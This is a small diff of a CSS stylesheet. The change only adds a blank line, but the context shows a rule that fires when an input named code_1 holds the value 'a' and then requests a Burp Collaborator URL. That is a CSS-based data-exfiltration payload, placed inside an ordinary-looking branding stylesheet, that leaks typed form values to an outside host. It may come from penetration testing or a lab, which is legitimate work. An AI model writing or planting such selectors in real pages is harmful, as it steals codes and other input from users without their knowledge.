@@ -12,6 +12,7 @@ div.branding {
     background-repeat: no-repeat;
     background-size: cover;
 }
+
 input[name=code_1][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_a");
 }
